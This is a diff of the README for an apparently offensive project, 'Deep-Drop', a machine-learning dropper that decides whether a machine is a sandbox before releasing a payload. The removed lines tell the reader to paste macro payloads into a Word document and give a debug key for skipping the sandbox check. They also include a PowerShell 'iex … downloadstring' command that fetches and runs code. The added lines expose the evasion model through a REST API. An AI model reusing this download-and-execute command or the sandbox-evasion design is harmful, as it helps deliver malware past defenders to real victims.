@@ -1,40 +1,20 @@
 # Deep-Drop
-Machine learning enabled dropper
+The dropper implementation was proof-of-concept, and a lot of the inital code came from training code during research. This branch aims to simplify the project and expose model predictions through a REST API. (The old branch could get a makeover at some point using this API). 
 
-### Quick Start
-```
-pip install -r requirements.txt
-python deepdrop.py
-```
+## Process List Data
+The process list parsing was built around a specific inital access payload, as a result the parsing wasn't flexible. The API no longer makes an assumption about the process list structure and only cares about the features - process_count, user_count, and process_user_ratio.
 
-Copy paste the payload (core\macros) into a word doc and run.
+**Example cURL request**
 
-### Quick start
-```
-λ pip3 install requirements
-λ python3 deepdrop.py -d
-
- ____              ____
-|    \ ___ ___ ___|    \ ___ ___ ___
-|  |  | -_| -_| . |  |  |  _| . | . |
-|____/|___|___|  _|____/|_| |___|  _|
-              |_|               |_|
-
-
-[-] All models loaded
-[-] Routes loaded
-[-] Payloads patched for localhost
-
-[DBG] ece9d57d-ef30-47ed-accb-46ea3c436257
-
- * Serving Flask app "deepdrop" (lazy loading)
+```curl
+curl http://localhost/api/v1/predict?process_count=345&user_count=2&process_user_ratio=172.5
+{'decision_tree': 0.0}
 ```
 
-### Testing
-Passing `-d\--debug` to deepdrop will give back a key that can be used to bypass the sandbox check for testing payloads. `powershell.exe -c "iex (new-object net.webclient).downloadstring('http://localhost/ece9d57d-ef30-47ed-accb-46ea3c436257')"`. Otherwise, submitting a process list and getting a decision from the model is the only way to get a payload executed.
-
-### Staging 
-Currently only powershell staging is implemented.
+## Predictions
+Returning scores for both models was somewhat arbitrary. During training and evaluation you would deploy the model that is the most accurate, and re-evaluate on a periodic basis as more data was collected.
 
 ## Training
-Implemented in Jupyter notebooks
+Training code has not changed.
+
+## TODO
